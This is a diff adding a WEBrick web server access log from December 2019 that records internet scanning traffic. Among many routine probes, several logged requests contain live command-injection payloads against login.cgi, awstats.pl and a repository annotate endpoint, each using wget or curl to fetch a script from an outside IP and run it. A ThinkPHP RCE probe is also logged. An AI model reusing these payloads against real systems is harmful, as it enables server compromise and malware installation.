@@ -1,0 +1,191 @@
+[2019-12-05 10:00:32] INFO  WEBrick 1.5.0
+[2019-12-05 10:00:32] INFO  ruby 2.5.1 (2018-03-29) [x86_64-linux-gnu]
+[2019-12-05 10:00:32] INFO  WEBrick::HTTPServer#start: pid=415 port=80
+185.153.196.97 - - [05/Dec/2019:10:05:00 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 1574 0.2237
+185.143.119.149 - - [05/Dec/2019:11:37:02 +0000] "GET / HTTP/1.1" 200 1574 0.0056
+58.87.104.102 - - [05/Dec/2019:11:46:36 +0000] "GET /TP/public/index.php HTTP/1.1" 404 562 0.0039
+58.87.104.102 - - [05/Dec/2019:11:46:36 +0000] "GET /TP/index.php HTTP/1.1" 404 562 0.0028
+58.87.104.102 - - [05/Dec/2019:11:46:37 +0000] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 562 0.0031
+58.87.104.102 - - [05/Dec/2019:11:46:37 +0000] "GET /html/public/index.php HTTP/1.1" 404 562 0.0061
+58.87.104.102 - - [05/Dec/2019:11:46:38 +0000] "GET /public/index.php HTTP/1.1" 404 562 0.0051
+58.87.104.102 - - [05/Dec/2019:11:46:38 +0000] "GET /TP/html/public/index.php HTTP/1.1" 404 562 0.0045
+58.87.104.102 - - [05/Dec/2019:11:46:38 +0000] "GET /elrekt.php HTTP/1.1" 404 562 0.0042
+58.87.104.102 - - [05/Dec/2019:11:46:39 +0000] "GET /index.php HTTP/1.1" 404 562 0.0038
+58.87.104.102 - - [05/Dec/2019:11:46:39 +0000] "GET / HTTP/1.1" 200 1574 0.0039
+178.22.116.252 - - [05/Dec/2019:13:00:09 +0000] "GET / HTTP/1.1" 200 1574 0.0036
+84.33.125.252 - - [05/Dec/2019:13:39:10 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=busybox&curpath=/&currentsetting.htm=1 HTTP/1.1" 404 562 0.0067
+[2019-12-05 13:39:12] ERROR Errno::ECONNRESET: Connection reset by peer @ io_fillbuf - fd:11 
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/httpserver.rb:82:in `eof?'
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/httpserver.rb:82:in `run'
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/server.rb:307:in `block in start_thread'
+185.128.41.50 - - [05/Dec/2019:14:08:49 +0000] "GET /manager/html HTTP/1.1" 404 562 0.0082
+201.17.70.227 - - [05/Dec/2019:15:24:18 +0000] "GET / HTTP/1.1" 200 1574 0.0030
+212.192.202.10 - - [05/Dec/2019:16:30:56 +0000] "GET / HTTP/1.1" 200 1574 0.0064
+78.96.32.234 - - [05/Dec/2019:18:10:44 +0000] "GET / HTTP/1.1" 200 1574 0.0098
+186.233.102.115 - - [05/Dec/2019:18:57:39 +0000] "GET / HTTP/1.1" 200 1574 0.0073
+107.174.14.121 - - [05/Dec/2019:19:52:08 +0000] "GET /index.php HTTP/1.1" 404 562 0.0061
+[2019-12-05 19:52:08] ERROR Errno::ECONNRESET: Connection reset by peer @ io_fillbuf - fd:11 
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/httpserver.rb:82:in `eof?'
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/httpserver.rb:82:in `run'
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/server.rb:307:in `block in start_thread'
+171.22.86.175 - - [05/Dec/2019:20:03:34 +0000] "GET / HTTP/1.1" 200 1574 0.0029
+167.172.41.206 - - [06/Dec/2019:00:26:20 +0000] "POST /upgrade.aspx?a1=a51599c6 HTTP/1.1" 404 562 0.0097
+[2019-12-06 00:26:20] ERROR bad Request-Line `'.
+36.158.69.41 - - [06/Dec/2019:00:44:15 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=busybox&curpath=/&currentsetting.htm=1 HTTP/1.1" 404 562 0.0067
+[2019-12-06 00:44:17] ERROR Errno::ECONNRESET: Connection reset by peer @ io_fillbuf - fd:11 
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/httpserver.rb:82:in `eof?'
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/httpserver.rb:82:in `run'
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/server.rb:307:in `block in start_thread'
+71.6.232.9 - - [06/Dec/2019:01:28:16 +0000] "GET / HTTP/1.1" 200 1574 0.0068
+92.118.160.13 - - [06/Dec/2019:03:30:47 +0000] "GET / HTTP/1.1" 200 1574 0.0033
+213.207.231.104 - - [06/Dec/2019:08:03:25 +0000] "GET / HTTP/1.1" 200 1574 0.0044
+[2019-12-06 08:38:50] ERROR invalid body size.
+159.148.65.129 - - [06/Dec/2019:09:08:17 +0000] "GET / HTTP/1.1" 200 1574 0.0048
+62.4.14.206 - - [06/Dec/2019:09:14:19 +0000] "GET / HTTP/1.1" 200 1574 0.0066
+60.191.66.222 - - [06/Dec/2019:09:54:16 +0000] "GET /manager/html HTTP/1.1" 404 562 0.0027
+[2019-12-06 09:54:16] ERROR Errno::ECONNRESET: Connection reset by peer @ io_fillbuf - fd:11 
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/httpserver.rb:82:in `eof?'
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/httpserver.rb:82:in `run'
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/server.rb:307:in `block in start_thread'
+125.47.65.253 - - [06/Dec/2019:10:50:06 +0000] "GET /manager/html HTTP/1.1" 404 562 0.0028
+[2019-12-06 10:50:06] ERROR Errno::ECONNRESET: Connection reset by peer @ io_fillbuf - fd:11 
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/httpserver.rb:82:in `eof?'
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/httpserver.rb:82:in `run'
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/server.rb:307:in `block in start_thread'
+45.143.221.27 - - [06/Dec/2019:11:35:06 +0000] "GET / HTTP/1.1" 200 1574 0.0039
+185.153.196.97 - - [06/Dec/2019:11:49:07 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 1574 0.0033
+45.182.136.2 - - [06/Dec/2019:14:10:18 +0000] "GET / HTTP/1.1" 200 1574 0.0053
+159.224.75.1 - - [06/Dec/2019:16:10:04 +0000] "GET / HTTP/1.1" 200 1574 0.0062
+115.75.253.146 - - [06/Dec/2019:16:23:50 +0000] "GET / HTTP/1.1" 200 1574 0.0030
+103.56.114.162 - - [06/Dec/2019:17:07:36 +0000] "GET /TP/public/index.php HTTP/1.1" 404 562 0.0047
+103.56.114.162 - - [06/Dec/2019:17:07:36 +0000] "GET /TP/index.php HTTP/1.1" 404 562 0.0039
+103.56.114.162 - - [06/Dec/2019:17:07:36 +0000] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 562 0.0038
+103.56.114.162 - - [06/Dec/2019:17:07:37 +0000] "GET /html/public/index.php HTTP/1.1" 404 562 0.0060
+103.56.114.162 - - [06/Dec/2019:17:07:38 +0000] "GET /public/index.php HTTP/1.1" 404 562 0.0068
+103.56.114.162 - - [06/Dec/2019:17:07:38 +0000] "GET /TP/html/public/index.php HTTP/1.1" 404 562 0.0061
+103.56.114.162 - - [06/Dec/2019:17:07:39 +0000] "GET /elrekt.php HTTP/1.1" 404 562 0.0071
+103.56.114.162 - - [06/Dec/2019:17:07:39 +0000] "GET /index.php HTTP/1.1" 404 562 0.0051
+103.56.114.162 - - [06/Dec/2019:17:07:40 +0000] "GET / HTTP/1.1" 200 1574 0.0051
+185.153.196.97 - - [06/Dec/2019:17:50:28 +0000] "GET /admin HTTP/1.1" 404 562 0.0027
+43.252.11.74 - - [06/Dec/2019:17:58:13 +0000] "GET / HTTP/1.1" 200 1574 0.0090
+43.252.11.74 - - [06/Dec/2019:17:58:13 +0000] "GET / HTTP/1.1" 200 1574 0.0089
+52.14.79.150 - - [06/Dec/2019:20:16:10 +0000] "GET / HTTP/1.1" 200 1574 0.0031
+220.175.60.187 - - [06/Dec/2019:20:17:06 +0000] "GET / HTTP/1.1" 200 1574 0.0028
+[2019-12-06 20:17:07] ERROR Errno::ECONNRESET: Connection reset by peer @ io_fillbuf - fd:11 
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/httpserver.rb:82:in `eof?'
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/httpserver.rb:82:in `run'
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/server.rb:307:in `block in start_thread'
+124.160.236.208 - - [06/Dec/2019:20:17:08 +0000] "GET /common/info.cgi HTTP/1.1" 404 562 0.0028
+106.45.0.18 - - [06/Dec/2019:20:17:12 +0000] "GET /common/info.cgi HTTP/1.1" 404 562 0.0028
+58.19.92.131 - - [06/Dec/2019:20:17:14 +0000] "GET /common/info.cgi HTTP/1.1" 404 562 0.0036
+41.190.45.179 - - [06/Dec/2019:22:00:55 +0000] "GET / HTTP/1.1" 200 1574 0.0059
+71.6.232.9 - - [06/Dec/2019:23:04:41 +0000] "GET / HTTP/1.1" 200 1574 0.0033
+94.180.250.158 - - [06/Dec/2019:23:07:47 +0000] "GET /TP/public/index.php HTTP/1.1" 404 562 0.0032
+94.180.250.158 - - [06/Dec/2019:23:07:47 +0000] "GET /TP/index.php HTTP/1.1" 404 562 0.0034
+94.180.250.158 - - [06/Dec/2019:23:07:48 +0000] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 562 0.0038
+94.180.250.158 - - [06/Dec/2019:23:07:48 +0000] "GET /html/public/index.php HTTP/1.1" 404 562 0.0033
+94.180.250.158 - - [06/Dec/2019:23:07:48 +0000] "GET /public/index.php HTTP/1.1" 404 562 0.0033
+94.180.250.158 - - [06/Dec/2019:23:07:49 +0000] "GET /TP/html/public/index.php HTTP/1.1" 404 562 0.0021
+94.180.250.158 - - [06/Dec/2019:23:07:49 +0000] "GET /elrekt.php HTTP/1.1" 404 562 0.0053
+94.180.250.158 - - [06/Dec/2019:23:07:49 +0000] "GET /index.php HTTP/1.1" 404 562 0.0063
+94.180.250.158 - - [06/Dec/2019:23:07:49 +0000] "GET / HTTP/1.1" 200 1574 0.0054
+79.141.9.4 - - [07/Dec/2019:01:27:48 +0000] "GET / HTTP/1.1" 200 1574 0.0041
+84.201.157.103 - - [07/Dec/2019:02:18:34 +0000] "GET /image.php HTTP/1.1" 404 562 0.0055
+51.158.24.107 - - [07/Dec/2019:02:27:12 +0000] "GET / HTTP/1.1" 200 1574 0.0069
+142.93.245.188 - - [07/Dec/2019:03:01:15 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://194.50.171.185/Venom.sh%20-O%20-%3E%20/tmp/kh;Venom.sh%20/tmp/kh%27$ HTTP/1.1" 404 562 0.0070
+188.121.161.31 - - [07/Dec/2019:04:24:12 +0000] "GET / HTTP/1.1" 200 1574 0.0030
+[2019-12-07 05:22:24] ERROR bad URI `mstshash=Administr'.
+185.153.196.97 - - [07/Dec/2019:09:30:52 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 1574 0.0030
+95.226.234.181 - - [07/Dec/2019:09:50:18 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=busybox&curpath=/&currentsetting.htm=1 HTTP/1.1" 404 562 0.0057
+[2019-12-07 09:50:19] ERROR Errno::ECONNRESET: Connection reset by peer @ io_fillbuf - fd:11 
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/httpserver.rb:82:in `eof?'
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/httpserver.rb:82:in `run'
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/server.rb:307:in `block in start_thread'
+120.92.12.108 - - [07/Dec/2019:10:04:24 +0000] "GET /TP/public/index.php HTTP/1.1" 404 562 0.0031
+120.92.12.108 - - [07/Dec/2019:10:04:25 +0000] "GET /TP/index.php HTTP/1.1" 404 562 0.0034
+120.92.12.108 - - [07/Dec/2019:10:04:26 +0000] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 562 0.0028
+120.92.12.108 - - [07/Dec/2019:10:04:26 +0000] "GET /html/public/index.php HTTP/1.1" 404 562 0.0027
+120.92.12.108 - - [07/Dec/2019:10:04:27 +0000] "GET /public/index.php HTTP/1.1" 404 562 0.0028
+120.92.12.108 - - [07/Dec/2019:10:04:28 +0000] "GET /TP/html/public/index.php HTTP/1.1" 404 562 0.0027
+120.92.12.108 - - [07/Dec/2019:10:04:29 +0000] "GET /elrekt.php HTTP/1.1" 404 562 0.0027
+120.92.12.108 - - [07/Dec/2019:10:04:29 +0000] "GET /index.php HTTP/1.1" 404 562 0.0026
+120.92.12.108 - - [07/Dec/2019:10:04:30 +0000] "GET / HTTP/1.1" 200 1574 0.0030
+45.50.131.136 - - [07/Dec/2019:11:15:27 +0000] "GET / HTTP/1.1" 200 1574 0.0064
+[2019-12-07 11:15:27] ERROR Errno::ECONNRESET: Connection reset by peer @ io_fillbuf - fd:11 
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/httpserver.rb:82:in `eof?'
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/httpserver.rb:82:in `run'
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/server.rb:307:in `block in start_thread'
+82.52.201.194 - - [07/Dec/2019:12:42:16 +0000] "GET / HTTP/1.1" 200 1574 0.0067
+185.153.196.97 - - [07/Dec/2019:12:50:29 +0000] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 562 0.0036
+103.119.141.70 - - [07/Dec/2019:15:40:28 +0000] "GET / HTTP/1.1" 200 1574 0.0062
+89.190.80.27 - - [07/Dec/2019:16:56:39 +0000] "GET / HTTP/1.1" 200 1574 0.0069
+103.65.193.129 - - [07/Dec/2019:17:03:14 +0000] "GET / HTTP/1.1" 200 1574 0.0061
+36.76.23.255 - - [07/Dec/2019:17:32:26 +0000] "GET / HTTP/1.1" 200 1574 0.0030
+[2019-12-07 20:25:17] ERROR bad URI `mstshash=Administr'.
+[2019-12-07 20:25:18] ERROR bad URI `mstshash=Administr'.
+36.91.111.15 - - [07/Dec/2019:21:04:12 +0000] "GET / HTTP/1.1" 200 1574 0.0061
+49.234.36.227 - - [07/Dec/2019:22:12:05 +0000] "GET /TP/public/index.php HTTP/1.1" 404 562 0.0033
+49.234.36.227 - - [07/Dec/2019:22:12:06 +0000] "GET /TP/index.php HTTP/1.1" 404 562 0.0029
+49.234.36.227 - - [07/Dec/2019:22:12:06 +0000] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 562 0.0055
+49.234.36.227 - - [07/Dec/2019:22:12:07 +0000] "GET /html/public/index.php HTTP/1.1" 404 562 0.0048
+49.234.36.227 - - [07/Dec/2019:22:12:07 +0000] "GET /public/index.php HTTP/1.1" 404 562 0.0042
+49.234.36.227 - - [07/Dec/2019:22:12:08 +0000] "GET /TP/html/public/index.php HTTP/1.1" 404 562 0.0039
+49.234.36.227 - - [07/Dec/2019:22:12:08 +0000] "GET /elrekt.php HTTP/1.1" 404 562 0.0034
+49.234.36.227 - - [07/Dec/2019:22:12:09 +0000] "GET /index.php HTTP/1.1" 404 562 0.0032
+49.234.36.227 - - [07/Dec/2019:22:12:10 +0000] "GET / HTTP/1.1" 200 1574 0.0032
+[2019-12-07 22:25:31] ERROR bad Request-Line `H\x00\x00\x00tj®û#Dò+ ßªl≈\x19◊ç∂\x18ÌJ\x1En¡˘xu[lE\x1D-jÏ‘xL…r…\x15\x10u‡%ÜRtg\x05fvÜ]%ÃÄ\fËœÆ\x00µ¿f»çD≈\tÙ'.
+139.162.119.197 - - [07/Dec/2019:22:27:54 +0000] "GET / HTTP/1.1" 200 1574 0.0028
+80.232.232.83 - - [07/Dec/2019:22:35:26 +0000] "POST /editBlackAndWhiteList HTTP/1.1" 404 562 0.0036
+190.110.204.74 - - [07/Dec/2019:23:29:00 +0000] "GET / HTTP/1.1" 200 1574 0.0030
+85.97.196.40 - - [08/Dec/2019:00:08:08 +0000] "GET /shell?busybox HTTP/1.1" 404 562 0.0061
+[2019-12-08 00:08:10] ERROR Errno::ECONNRESET: Connection reset by peer @ io_fillbuf - fd:11 
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/httpserver.rb:82:in `eof?'
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/httpserver.rb:82:in `run'
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/server.rb:307:in `block in start_thread'
+83.97.20.49 - - [08/Dec/2019:00:41:02 +0000] "GET / HTTP/1.1" 200 1574 0.0037
+185.158.113.63 - - [08/Dec/2019:01:42:51 +0000] "HEAD /files/penelop/5.exe HTTP/1.1" 404 562 0.0033
+185.153.196.97 - - [08/Dec/2019:02:59:37 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 1574 0.0064
+183.131.110.114 - - [08/Dec/2019:03:32:14 +0000] "GET / HTTP/1.1" 200 1574 0.0052
+[2019-12-08 03:32:14] ERROR Errno::ECONNRESET: Connection reset by peer @ io_fillbuf - fd:11 
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/httpserver.rb:82:in `eof?'
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/httpserver.rb:82:in `run'
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/server.rb:307:in `block in start_thread'
+91.211.178.123 - - [08/Dec/2019:05:25:29 +0000] "GET / HTTP/1.1" 200 1574 0.0030
+106.13.48.211 - - [08/Dec/2019:06:32:19 +0000] "GET /TP/public/index.php HTTP/1.1" 404 562 0.0060
+106.13.48.211 - - [08/Dec/2019:06:32:19 +0000] "GET /TP/index.php HTTP/1.1" 404 562 0.0060
+106.13.48.211 - - [08/Dec/2019:06:32:20 +0000] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 562 0.0025
+106.13.48.211 - - [08/Dec/2019:06:32:25 +0000] "GET / HTTP/1.1" 200 1574 0.0059
+[2019-12-08 07:17:14] ERROR bad Request-Line `\x05\x01\x00'.
+[2019-12-08 07:17:19] ERROR bad Request-Line `\x05\x01\x00'.
+[2019-12-08 07:17:25] ERROR bad Request-Line `\x05\x01\x00'.
+[2019-12-08 07:18:06] ERROR bad Request-Line `\x04\x01\x00P\x05º“e\x00'.
+[2019-12-08 07:18:11] ERROR bad Request-Line `\x04\x01\x00P\x05º“e\x00'.
+[2019-12-08 07:18:17] ERROR bad Request-Line `\x04\x01\x00P\x05º“e\x00'.
+5.188.210.101 - - [08/Dec/2019:07:18:54 +0000] "GET /echo.php HTTP/1.1" 404 562 0.0054
+46.34.174.65 - - [08/Dec/2019:07:54:56 +0000] "GET / HTTP/1.1" 200 1574 0.0029
+169.197.108.6 - - [08/Dec/2019:09:42:46 +0000] "GET / HTTP/1.1" 200 1574 0.0070
+187.57.38.171 - - [08/Dec/2019:10:51:12 +0000] "GET / HTTP/1.1" 200 1574 0.0038
+194.182.72.52 - - [08/Dec/2019:12:07:37 +0000] "GET / HTTP/1.1" 200 1574 0.0062
+103.96.51.60 - - [08/Dec/2019:12:29:50 +0000] "GET / HTTP/1.1" 200 1574 0.0065
+[2019-12-08 13:00:09] ERROR bad Request-Line `GET /cgi-bin/awstats.pl?migrate=|echo;echo%20YYY;wget http://80.82.67.209/richard; curl -O http://80.82.67.209/richard; chmod +x richard; sh richard;echo%20YYY;echo|awstats HTTP/1.0'.
+[2019-12-08 13:00:16] ERROR bad Request-Line `GET /cgi-bin/awstats.pl?migrate=|echo;echo%20YYY;wget http://80.82.67.209/richard; curl -O http://80.82.67.209/richard; chmod +x richard; sh richard;echo%20YYY;echo|awstats HTTP/1.0'.
+103.116.84.53 - - [08/Dec/2019:13:12:17 +0000] "GET / HTTP/1.1" 200 1574 0.0063
+122.165.171.147 - - [08/Dec/2019:13:48:36 +0000] "GET / HTTP/1.1" 200 1574 0.0059
+178.173.193.178 - - [08/Dec/2019:14:34:48 +0000] "GET / HTTP/1.1" 200 1574 0.0061
+91.143.220.130 - - [08/Dec/2019:15:16:58 +0000] "GET / HTTP/1.1" 200 1574 0.0063
+213.231.173.99 - - [08/Dec/2019:15:28:17 +0000] "GET / HTTP/1.1" 200 1574 0.0057
+178.128.97.153 - - [08/Dec/2019:19:22:10 +0000] "GET / HTTP/1.1" 200 1574 0.0034
+[2019-12-08 19:22:10] ERROR Errno::ECONNRESET: Connection reset by peer @ io_fillbuf - fd:11 
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/httpserver.rb:82:in `eof?'
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/httpserver.rb:82:in `run'
+	/var/lib/gems/2.5.0/gems/webrick-1.5.0/lib/webrick/server.rb:307:in `block in start_thread'
+178.73.215.171 - - [08/Dec/2019:20:57:36 +0000] "GET / HTTP/1.1" 200 1574 0.0061
+[2019-12-08 21:14:47] ERROR invalid body size.
+212.200.94.210 - - [09/Dec/2019:00:03:46 +0000] "GET / HTTP/1.1" 200 1574 0.0070
+85.116.137.30 - - [09/Dec/2019:01:04:33 +0000] "GET / HTTP/1.1" 200 1574 0.0027
+185.153.196.97 - - [09/Dec/2019:01:39:33 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 1574 0.0043
+200.196.47.47 - - [09/Dec/2019:03:42:22 +0000] "GET / HTTP/1.1" 200 1574 0.0097
+[2019-12-09 03:43:21] ERROR bad Request-Line `GET /repository/annotate?rev=`wget http://80.82.67.209/richard; curl -O http://80.82.67.209/richard; chmod +x richard; sh richard` HTTP/1.0'.
+[2019-12-09 03:43:23] ERROR bad Request-Line `GET /repository/annotate?rev=`wget http://80.82.67.209/richard; curl -O http://80.82.67.209/richard; chmod +x richard; sh richard` HTTP/1.0'.
+[2019-12-09 03:43:24] ERROR bad Request-Line `GET /repository/annotate?rev=`wget http://80.82.67.209/richard; curl -O http://80.82.67.209/richard; chmod +x richard; sh richard` HTTP/1.0'.
+185.128.41.50 - - [09/Dec/2019:04:20:48 +0000] "GET /manager/html HTTP/1.1" 404 562 0.0055
